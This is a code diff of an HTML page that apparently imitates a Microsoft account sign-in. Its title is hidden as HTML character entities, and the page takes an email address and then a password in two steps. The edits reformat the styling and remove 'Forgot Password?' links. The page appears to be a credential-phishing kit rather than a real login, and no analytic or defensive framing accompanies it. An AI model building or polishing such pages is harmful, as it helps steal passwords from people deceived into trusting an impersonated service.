@@ -1,58 +1,60 @@
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
 <html>
 <head>
-<title>&#83;&#105;&#103;&#110;&#32;&#105;&#110;&#32;&#116;&#111;&#32;&#121;&#111;&#117;&#114;&#32;&#77;&#105;&#99;&#114;&#111;&#115;&#111;&#102;&#116;&#32;&#97;&#99;&#99;&#111;&#117;&#110;&#116;</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<link rel="shortcut icon" href="images/favicon.ico"/>
+    <title>&#83;&#105;&#103;&#110;&#32;&#105;&#110;&#32;&#116;&#111;&#32;&#121;&#111;&#117;&#114;&#32;&#77;&#105;&#99;&#114;&#111;&#115;&#111;&#102;&#116;&#32;&#97;&#99;&#99;&#111;&#117;&#110;&#116;</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="images/favicon.ico"/>
 
-<style type="text/css">
-    body {
-        text-align: center;
-        margin: 0;
-        background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') no-repeat center center fixed;
-        background-size: cover;
-    }
-
-    .textbox {
-        height: 36px;
-        width: 275px;
-        padding-left: 8px;
-        font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue", "Roboto", "Ebrima", "Nirmala UI";
-        font-size: 15px;
-        line-height: 20px;
-        font-weight: 400;
-        border: none;
-        border-bottom: 1px solid #666;
-    }
-
-    .textbox:focus {
-        border: none;
-        border-bottom: 1px solid #4488cc;
-        outline: 0;
-    }
-
-    .hidden {
-        display: none;
-    }
-</style>
-
-<script type="text/javascript">
-    // Show password step and hide email step
-    function showPasswordStep() {
-        const emailInput = document.querySelector('input[name="user"]');
-        const email = emailInput.value;
-
-        // Simple regex for email validation
-        const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-
-        if (emailPattern.test(email)) {
-            document.getElementById('emailStep').classList.add('hidden');
-            document.getElementById('passwordStep').classList.remove('hidden');
-        } else {
-            alert("Please enter a valid email address.");
+    <style type="text/css">
+        body {
+            text-align: center;
+            margin: 0;
+            height: 100vh; /* Ensure the body takes the full height of the viewport */
+            background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') no-repeat center center fixed;
+            background-size: cover; /* Cover the entire page */
+            opacity: 0.8; /* Set opacity for transparency */
         }
-    }
-</script>
+
+        .textbox {
+            height: 36px;
+            width: 275px;
+            padding-left: 8px;
+            font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue", "Roboto", "Ebrima", "Nirmala UI";
+            font-size: 15px;
+            line-height: 20px;
+            font-weight: 400;
+            border: none;
+            border-bottom: 1px solid #666;
+        }
+
+        .textbox:focus {
+            border: none;
+            border-bottom: 1px solid #4488cc;
+            outline: 0;
+        }
+
+        .hidden {
+            display: none;
+        }
+    </style>
+
+    <script type="text/javascript">
+        // Show password step and hide email step
+        function showPasswordStep() {
+            const emailInput = document.querySelector('input[name="user"]');
+            const email = emailInput.value;
+
+            // Simple regex for email validation
+            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+            if (emailPattern.test(email)) {
+                document.getElementById('emailStep').classList.add('hidden');
+                document.getElementById('passwordStep').classList.remove('hidden');
+            } else {
+                alert("Please enter a valid email address.");
+            }
+        }
+    </script>
 
 </head>
 <body>
@@ -73,11 +75,6 @@
         <div id="image2" style="position:absolute; overflow:hidden; left:508px; top:388px; width:137px; height:17px; z-index:1">
             <a href="#"><img src="images/zt4.png" alt="" title="" border=0 width=137 height=17></a>
         </div>
-
-        <!-- Forgot Password link -->
-        <div style="position:absolute; left:507px; top:350px; z-index:4">
-            <a href="#" style="font-size: 14px;">Forgot Password?</a>
-        </div>
     </div>
 
     <!-- Password Step (Step 2 - initially hidden) -->
@@ -97,11 +94,6 @@
         <!-- Submit button -->
         <div id="formimage1" style="position:absolute; left:749px; top:424px; z-index:5">
             <input type="image" name="formimage1" width="110" height="34" src="images/zgn.png">
-        </div>
-
-        <!-- Forgot Password link next to password input -->
-        <div style="position:absolute; left:900px; top:299px; z-index:4">
-            <a href="#" style="font-size: 14px;">Forgot Password?</a>
         </div>
     </div>
 </form>
